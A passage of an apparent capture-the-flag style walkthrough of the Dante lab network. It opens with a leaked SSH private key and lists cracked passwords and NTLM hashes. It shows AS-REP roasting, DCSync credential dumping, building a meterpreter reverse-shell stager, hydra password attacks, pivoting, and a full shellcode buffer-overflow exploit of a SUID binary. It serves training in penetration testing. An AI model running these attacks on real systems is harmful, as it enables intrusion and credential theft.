slo1mFBRpLDU0sma5M87NwA77vcANQAAAAMBAAEAAAGAWcjjr1UyRumg8+nZbYE3ffCROa
MQXIniLUoyMHvMRfRzgOAmDUY0JTMKM0zoaw6lw1c/O77C+d37kNvqKJhK1k033ttrrjcr
tbusaAP8o3T80WXWM2RUvbDDnFF8+XCB9xF0RssNWn9jez3cTTAN6hBbjRusLAXshB39a6
HUtwR2LYy8T/9xh0eRN5B6Ql6p08i8j7q2GlEIzyep1gAnCbXCEypS8rLUiPYGJEiIO8GN
9LoHXUwCZ37FQzQAGHvlzMU6543GAulJpAE3S2C4EEtYSxxYaSv3GTQDMRHD3Xu9xDExGy
MVa/kGvAhCLeh7LhHENaurl8dnLMFWR9Da5Kzkgusbroipt5yTrIAQx+EZl62BeT93laEQ
e1f7GnfZ1mhnSF9Fnlfif49P9ACUztpVY6G5iLJA7JpadG08SmtJN8mWZPZENoyPog8iFz
/DjUozlXeQIfRjBgC22evYqnfDc/I7mQEdhQ/jK8qZpHAWEbej8HScqRJFo4Q8fZ3pAAAA
wQDVP01sxMAISk0J34w3DDGnZFj0EJq4ajFbpi+NZegpp/+38ADRNHNZTnw8js/Ei2oQZj
5D5hMoG5wZv2RRm2kQsSRRTAuHkssDJZNqIhN/jyd5hL7uv9WDp3cmJxb8KBlmpuZAzgxw
kBPO8L+D+Ai28anzGgo/uz4mE42wsTb8WfViiIYPWmIzpOLqiClr50Vzr2WFhNMM+PmfqZ
X3NNKD34F5TDSmCKcN9xHC2ME1EPAsNafHXkbMn9XmoQxGowwAAADBAOU77xcteMmA9RjD
KdqMLu79ksNJtUPtfDTa5z89qhPiroRKC3qfgT53dopodwdAm/FRF5+77Kli15UUWDEfpZ
GxzRd0gD50glxYSQI3+9nC+aaGqrGxR2WAKuXHLU4ozmHXIDsmVp94m8Yjl1oULKdV2G1i
ozjj9FmtlUnPFce/p8fk1Mq0jQiFgNrXSrkzDNPDhDCzRZygmCf0spknxnxMK92xaE8ril
9vPbGcAqX5C6EyfuNKRRvVGcCqRqyJqwAAAMEAzax6pBMWN2dka2cf1tvVEMu5P+p1bOg4
cp+N4tmLc4tj8bzY5fBlAyama25uzjat76VfpLmM1ZPL/jaGWW/dDUO/7JVeNA8GPwr1e9
D/ay6cIgM/ne9dBiuTXcpowFqvbc0egQc0mEfDLJKWu34YhyP0K0pVz9PC2f4dqzxMcgwE
hdvxX0icC4KPhgif82bY4Kjx0WO2wKtHJpUA8WndzWrv/iRNGw719SAs3nZBA0mHwW8pm9
uyOm819es8v32fAAAAGWRhbnRlXGthdHdhbWJhQERBTlRFLURDMDEB
-----END OPENSSH PRIVATE KEY-----

```

## 172.16.2.5 DANTE-DC02

Let’s enumerate open ports and services:

```bash
sudo nmap -sC -sV -oN 172.16.2.5 172.16.2.5 

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-08 11:57:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DANTE-DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the open ports, it seemed to be another DC. 

Let’s add the domain name and hostname to our /etc/hosts file:

```bash
172.16.2.5 DANTE-DC02.DANTE.ADMIN dante.admin
```

Let’s attempt enumerating with nxc:

```bash
nxc smb DANTE-DC02.DANTE.ADMIN -u '' -p '' --shares

SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
SMB         172.16.2.5      445    DANTE-DC02       [+] DANTE.ADMIN\: 
SMB         172.16.2.5      445    DANTE-DC02       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

rpcclient:

```bash
rpcclient -U'%' DANTE-DC02.DANTE.ADMIN

enumdomusers

DENIED
```

Let’s try using the creds we found to enuemrate:

```bash
nxc smb dante-dc02.dante.admin -u users.txt -p pwds.txt --no-brute

nxc smb dante-dc02.dante.admin -u mrb3n -p S3kur1ty2025!
```

None were successful.

Since we do have a users list, from the creds and DC01, let’s see if any user ASREPRoastable:

```bash
nxc ldap dante-dc02.dante.admin -u users.txt -p '' --asreproast asreproast.out

LDAP        172.16.2.5      389    DANTE-DC02       $krb5asrep$23$jbercov@DANTE.ADMIN:55a806a51ae782d6f930d485564a6aa6$a1f75cfa49bf416ab857fac47d72a99093b86aacdbc32f640e667193409e10f6eb42c6268780e6e87983e53845faef4a5097a09f052d4d241fc463d4ead4b036abc2518af04165ade61ef70b6ca4f1ddeb4f50da74b9c45fd45d611900f18129023000c3956e20c2bbda7b4e9de8d7ef93795b8bdebd3dd06d061ef405cab71b8df4de158f2c7244259ffcb38a94bca13fa80985999aeb6c9250aa4e508c070c0674d72471b2503b6583b8a1e23009bff62cebe1bdad7449799978b91e37e8f1b6d4ee41bf2ad41ad81b2f363df87e854d9f4881083e9c521819c0f4f650b91e72e07d17d90342563330
```

Let’s try cracking the hash:

```bash
.\hashcat.exe -m 18200 ..\hashes.txt ..\rockyou.txt 

jbercov:myspace7
```

Now let’s enumerate SMB share:

```bash
nxc smb dante-dc02.dante.admin -u jbercov -p myspace7 --shares

SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
SMB         172.16.2.5      445    DANTE-DC02       [+] DANTE.ADMIN\jbercov:myspace7 
SMB         172.16.2.5      445    DANTE-DC02       [*] Enumerated shares
SMB         172.16.2.5      445    DANTE-DC02       Share           Permissions     Remark
SMB         172.16.2.5      445    DANTE-DC02       -----           -----------     ------
SMB         172.16.2.5      445    DANTE-DC02       ADMIN$                          Remote Admin
SMB         172.16.2.5      445    DANTE-DC02       C$                              Default share
SMB         172.16.2.5      445    DANTE-DC02       IPC$            READ            Remote IPC
SMB         172.16.2.5      445    DANTE-DC02       NETLOGON        READ            Logon server share 
SMB         172.16.2.5      445    DANTE-DC02       SYSVOL          READ            Logon server share
```

Let’s enumerate NETLOGON:

```bash
nxc smb dante-dc02.dante.admin -u jbercov -p myspace7 --spider NETLOGON --regex .

```

Nothing. Let’s map out the AD with rusthound:

```bash
rusthound-ce -u jbercov -p myspace7 -d dante.admin
```

Now uploading the json files to bloodhound, let’s view our rights.

![image.png]({{ site.baseurl }}/assets/dante/image%2089.png)

We have WriteGPLink to the DC.

Let’s check our group privileges before moving on:

![image.png]({{ site.baseurl }}/assets/dante/image%2090.png)

We are part of the remote management users group. 

We can check whether we have DCSync rights.

```bash
nxc ldap dante-dc02.dante.admin -u jbercov -p myspace7 -M daclread -o TARGET_DN="DC=dante,DC=admin" ACTION=read RIGHTS=DCSync

DACLREAD    172.16.2.5      389    DANTE-DC02       Be careful, this module cannot read the DACLS recursively.
DACLREAD    172.16.2.5      389    DANTE-DC02       Target principal found in LDAP (DC=DANTE,DC=ADMIN)
DACLREAD    172.16.2.5      389    DANTE-DC02       ACE[24] info                
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE flags                 : None
DACLREAD    172.16.2.5      389    DANTE-DC02           Access mask               : ControlAccess
DACLREAD    172.16.2.5      389    DANTE-DC02           Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    172.16.2.5      389    DANTE-DC02           Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
DACLREAD    172.16.2.5      389    DANTE-DC02           Trustee (SID)             : Domain Controllers (S-1-5-21-1107894465-4119991344-1603665553-516)
DACLREAD    172.16.2.5      389    DANTE-DC02       ACE[25] info                
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE flags                 : None
DACLREAD    172.16.2.5      389    DANTE-DC02           Access mask               : ControlAccess
DACLREAD    172.16.2.5      389    DANTE-DC02           Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    172.16.2.5      389    DANTE-DC02           Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
DACLREAD    172.16.2.5      389    DANTE-DC02           Trustee (SID)             : jbercov (S-1-5-21-1107894465-4119991344-1603665553-1106)
DACLREAD    172.16.2.5      389    DANTE-DC02       ACE[34] info                
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    172.16.2.5      389    DANTE-DC02           ACE flags                 : None
DACLREAD    172.16.2.5      389    DANTE-DC02           Access mask               : ControlAccess
DACLREAD    172.16.2.5      389    DANTE-DC02           Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    172.16.2.5      389    DANTE-DC02           Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
DACLREAD    172.16.2.5      389    DANTE-DC02           Trustee (SID)             : Administrators (S-1-5-32-544)
```

```bash
impacket-secretsdump -just-dc-user Administrator jbercov:'myspace7'@dante-dc02.dante.admin

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
[*] Cleaning up... 

```

In the administrator’s Documents folder, we find a jenkins.bat:

```bash
net user Admin_129834765 SamsungOctober102030 /add
```

This might be for the Jenkins server on NIX05. Let’s note that down.

We also find a note.txt:

```bash
You were supposed to find this subnet via enumerating the browser history files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.

```

Let’s perform a ping sweep. Powershell ping sweep is sometimes inaccurate. Let’s get a cmd.exe shell. We can execute a meterpreter stager:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o rev.exe
```

Now start our listener:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 9001
set payload windows/x64/meterpreter/reverse_tcp
run
```

Upload rev.exe and execute it:

```bash
#on our evil-winrm session
upload rev.exe
.\rev.exe
```

We now have meterpreter shell:

```bash
shell
```

Now to ping sweep:

```bash
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"

Reply from 172.16.2.5: bytes=32 time<1ms TTL=128
Reply from 172.16.2.101: bytes=32 time<1ms TTL=64

```

From the TTL, we can assume it’s a Linux machine

## 172.16.2.101 DANTE-ADMIN-NIX05

Let’s get a better tunnel straight from the 172.16.2.0/24 subnet. Upload agent.exe onto the DC02:

```bash
wget http://10.10.16.4/agent.exe -o agent.exe

.\agent.exe -connect 10.10.16.4:11601 -ignore-cert
```

Now remove our old tunnel on the DC01 session:

```bash
#choose the correct seession
session
#stop the previous tunnel on DC01
stop
#now change the session back to DC02
session
start --tun ligolo-double
```

Now let’s test with ping again:

```bash
ping -c 1 172.16.2.101

PING 172.16.2.101 (172.16.2.101) 56(84) bytes of data.
64 bytes from 172.16.2.101: icmp_seq=1 ttl=64 time=72.3 ms

--- 172.16.2.101 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.343/72.343/72.343/0.000 ms
```

Now let’s scan with nmap:

```bash
sudo nmap -sC -sV -oN 172.16.2.101 172.16.2
```

Does not work. Disconnect after a while. Let’s set up ssh dynamic port forwarding and connect via proxychains, then setup ligolo tunnel to the 172.16.2.0/24 subnet.

Since we discovered ssh key earlier, let’s use katwamba to sign in and start dynamic port forwarding:

```bash
ssh -D 1080 -i katwamba.key katwamba@172.16.1.20
```

Now test our connection with proxychains; let’s log on to DC02

```bash
proxychains evil-winrm -u Administrator -H 4c827b7074e99eefd49d05872185f7f8 -i 172.16.2.5
```

Now let’s connect our agent:

```bash
wget http://10.10.16.6/agent.exe -o agent.exe
.\agent.exe -connect 10.10.16.6:11601 -ignore-cert

#on our host
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up
sudo ip route add 172.16.2.0/24 dev ligolo-double

#on our proxy session
session
start --tun ligolo-double

```

Now we should be to interact with 172.16.2.0/24 subnet:

```bash
ping -c 1 172.16.2.101

PING 172.16.2.101 (172.16.2.101) 56(84) bytes of data.
64 bytes from 172.16.2.101: icmp_seq=1 ttl=64 time=72.2 ms

--- 172.16.2.101 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.172/72.172/72.172/0.000 ms
```

Now let’s nmap scan:

```bash
sudo nmap -sV -sC -oN 172.16.2.101 172.16.2.101

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:d0:8e:88:ee:db:b4:cf:35:b7:db:cb:74:a0:50:0b (RSA)
|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Let’s do all port scan:

```bash
sudo nmap -p- 172.16.2.101 -v --min-rate=10000

22/tcp open  ssh

```

From our previous enumeration, we can try bruteforcing again with our found credentials with hydra:

```bash
hydra -C creds.txt ssh://172.16.2.101

[22][ssh] host: 172.16.2.101   login: julian   password: manchesterunited
```

Let’s log in:

```bash
ssh julian@172.16.2.101
```

![image.png]({{ site.baseurl }}/assets/dante/image%2091.png)

Let’s enumerate privileges:

![image.png]({{ site.baseurl }}/assets/dante/image%2092.png)

We are not part of any privileged groups.

Let’s upload linpeas to fully enumerate.

```bash
wget http://10.10.16.2:8001/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

```bash
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.4.0-39-generic (buildd@lcy01-amd64-016) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #43-Ubuntu SMP Fri Jun 19 10:28:31 UTC 202
0
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-3560

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      - 

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 128K Apr 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 15K May 21  2020 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Feb 11  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 root julian 17K Jun 30  2020 /usr/sbin/readfile (Unknown SUID binary!)

```

We see the unknown SUID binary. Let’s transfer that back to our host and decompile it with ghidra, to see what the binary do:

```bash
/usr/sbin/readfile

scp julian@172.16.2.101:/usr/sbin/readfile readfile
```

![image.png]({{ site.baseurl }}/assets/dante/image%2093.png)

The program expects a single command-line argument (a file path). It attempts to run as root (via setresuid), copies the provided path into a fixed-size buffer, and prints an error message claiming it couldn’t read the file at that path.

There also seem to be a buffer overflow vulnerability as it uses strcpy, which takes input from a user and only allocated a buffer size of 80. We can overflow that buffer. Let’s see what protections the binary has:

```bash
checksec --file readfile

[*] '/home/kali/pro-labs/dante/dante-admin-nix05/readfile'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The stack is executable, but ASLR is enabled.

Now let’s find the offset of RIP:

```bash
cyclic 100

run aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

regs

 RBP  0x616161616161616b ('kaaaaaaa')
 RSP  0x7fffffffdad8 ◂— 'laaaaaaamaaa'
 RIP  0x555555555238 (main+143) ◂— ret 
```

Let’s determine the offset to RIP:

```bash
cyclic -l laaaaaaa

Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
```

We want it to execute shell code on the stack. 

We find a shell code online:

https://www.exploit-db.com/exploits/43550

```bash
char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
```

Now our whole payload is:

```bash
payload = shellcode + (junk -len(shellcode)) + Address_shellcode 
```

Let’s find out where the shellcode will be:

```bash
r $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + (88-27) * "A" + "BBBBBBBB"')

run $(python2 -c 'print "C" * 27 + (88-27) * "A" + "BBBBBBBB"')

x/200xb $rsp-100
```

![image.png]({{ site.baseurl }}/assets/dante/image%2094.png)

Our shell code would be starting at 0x43:

```bash
7fffffffe36c + 4 bytes = 7fffffffe370

#little endian address
"\x70\xe3\xff\xff\xff\x7f"
```

Now let’s run our exploit again, this time with the return address:

```bash
r $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + (88-27) * "A" + "\x70\xe3\xff\xff\xff\x7f"')

```

![image.png]({{ site.baseurl }}/assets/dante/image%2095.png)

It ran, but as julain, since gdb does not elevate privilege. Let’s run it outside of gdb:

```bash
/usr/sbin/readfile $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + (88-27) * "A" + "\x70\xe3\xff\xff\xff\x7f"')

Error reading file located at 1HѝЌHST_RWT^;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
Segmentation fault (core dumped)
julian@DANTE-ADMIN-NIX05:/$ 

```

Did not work. That could be because the location is not correct due to ASLR. One way to bypass this is to use an environment variable:

```bash
export SHELLCODE=$(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
```

This places the shellcode in the process’s environment block, a memory region separate from the stack but accessible to the program.

We can use a helper program to locate the address of the environment variable:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;
    if (argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```

The adjustment accounts for stack alignment differences caused by differing lengths of the program names, as environment variables are stored after argv strings in memory.

Now let’s compile:

```bash
gcc getenv.c -o getenv

chmod +x getenv

./getenv SHELLCODE /usr/sbin/readfile

SHELLCODE will be at 0x7fffffffe779
```

In little endian:

```bash
\x79\xe7\xff\xff\xff\x7f
```

Now let’s execute again:

```bash
/usr/sbin/readfile $(python2 -c 'print 88 * "A" + "\x79\xe7\xff\xff\xff\x7f"')
```

![image.png]({{ site.baseurl }}/assets/dante/image%2096.png)

We are now root. Let’s add our public key:

```bash
cd /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3L2dEF1Lz4/jTwwFS9bYRZTt7PZkUx0eJmkN2vUQG6 kali@kali' >> authorized_keys
chown root:root authorized_keys
```

Now let’s ssh in:

```bash
ssh -i dante root@172.16.2.101
```

![image.png]({{ site.baseurl }}/assets/dante/image%2097.png)

Let’s perform another ping sweep:

```bash
for i in $(seq 254); do ping 172.16.2.$i -c1 -W1 & done | grep from

64 bytes from 172.16.2.6: icmp_seq=1 ttl=64 time=1.31 ms
64 bytes from 172.16.2.5: icmp_seq=1 ttl=128 time=0.480 ms
64 bytes from 172.16.2.101: icmp_seq=1 ttl=64 time=0.013 ms
```

This time we got a response from 172.16.2.6

Let’s upload nmap and scan the host.

## 172.16.2.6 DANTE-ADMIN-NIX06

```bash
wget http://10.10.16.2/nmap
wget http://10.10.16.2/nmap-services -O /etc/services

chmod +x nmap

./nmap

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:50:56:94:56:BE (Unknown)
```

Let’s try reusing julian’s credentials to login:

```bash
ssh julian@172.16.2.101
```

![image.png]({{ site.baseurl }}/assets/dante/image%2098.png)

We are on.

We find a file SQL on julian’s Desktop:

```bash
Hi Julian
I've put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James
```

Maybe this logs into SQL01 at 172.16.1.5 (it does).

Now let’s enumerate:

![image.png]({{ site.baseurl }}/assets/dante/image%2099.png)

Let’s upload linpeas to enumerate fully.

For some reason we can’t connect to our server, NIX05; tried wget and nc. Maybe there’s a firewall. 

Let’s use scp:

```bash
scp linpeas.sh julian@172.16.2.6:/tmp
```

Interesting findings:

```bash
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.3.0-61-generic (buildd@lcy01-amd64-014) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #55~18.04.1-Ubuntu SMP Mon Jun 22 16:
40:20 UTC 2020                     
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.21p2

╔══════════╣ Users with console
julian:x:1001:1001:,,,:/home/julian:/bin/bash
plongbottom:x:1000:1000:Paul,Longbottom,DANTE,DANTE,DANTE:/home/plongbottom:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(plongbottom) gid=1000(plongbottom) groups=1000(plongbottom),27(sudo)
uid=1001(julian) gid=1001(julian) groups=1001(julian)
```

From our previous enumerations, we remember plongbottom’s name. We have their password extracted from DC01’s excel spreadsheet. Let’s try that password:

```bash
su plongbottom

#PowerfixSaturdayClub777
```

We are in. And since we are in the sudo groups, let’s switch to root.

![image.png]({{ site.baseurl }}/assets/dante/image%20100.png)

We are now root.

## 172.16.1.101 DANTE-WS02

```bash
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
MAC Address: 00:50:56:94:F9:22 (Unknown)

sudo nmap -sC -sV -oN nmap/dante-ws02 172.16.1.101 -p 21,135,445,139,5040,5985

21/tcp   open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:f7:66 (VMware)
| smb2-time:
|   date: 2025-11-06T14:45:22
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 1h00m06s

```

SMB:

```bash
nxc smb 172.16.1.101 -u '' -p '' --shares

SMB         172.16.1.101    445    DANTE-WS02       [*] Windows 10 / Server 2019 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\: STATUS_ACCESS_DENIED 
SMB         172.16.1.101    445    DANTE-WS02       [-] Error enumerating shares: Error while reading from remote

```

### Foothold WS02

FTP

```bash
ftp 172.16.1.101 
```

anonymous login failed. 

Let’s try password spray with the credentials found in DC01:

```bash
hydra -C creds.txt -V ftp://172.16.1.101

[21][ftp] host: 172.16.1.101   login: dharding   password: WestminsterOrange5
```

Let’s logon:

```bash
ftp 172.16.1.101

get "Remote login.txt"
```

```bash
Dido,
I've had to change your account password due to some security issues we have recently become aware of

It's similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James                                                                                                                                               
```

Let’s create a password list with all the numbers fuzzed:

```bash
for i in {0..9}; do echo "WestminsterOrange$i"; done > candidates.txt
```

Let’s attempt.

```bash
nxc winrm 172.16.1.101 -u dharding -p candidates.txt
```

No result. Maybe the number is double digit?

```bash
for i in {0..99}; do echo "WestminsterOrange$i"; done > candidates.txt
```

```bash
nxc wirnm 172.16.1.101 -u dharding -p candidates.txt

WINRM       172.16.1.101    5985   DANTE-WS02       [+] DANTE-WS02\dharding:WestminsterOrange17 (Pwn3d!)

```

We got it. Let’s check shares first:

```bash
nxc smb 172.16.1.101 -u dharding -p WestminsterOrange17 --shares

SMB         172.16.1.101    445    DANTE-WS02       [+] DANTE-WS02\dharding:WestminsterOrange17 
SMB         172.16.1.101    445    DANTE-WS02       [*] Enumerated shares
SMB         172.16.1.101    445    DANTE-WS02       Share           Permissions     Remark
SMB         172.16.1.101    445    DANTE-WS02       -----           -----------     ------
SMB         172.16.1.101    445    DANTE-WS02       ADMIN$                          Remote Admin
SMB         172.16.1.101    445    DANTE-WS02       C$                              Default share
SMB         172.16.1.101    445    DANTE-WS02       IPC$            READ            Remote IPC

```

### Priviege Escalation WS02

Let’s logon via evil-winrm:

```bash
evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```

Let’s check our privileges:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

Nothing interesting.

We enumerate for DPAPI blobs. Nothing in roaming. But we find DPAPI blob here:

```bash
cd C:\Users\dharding\Appdata\Local\Microsoft\Credentials

ls -force

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
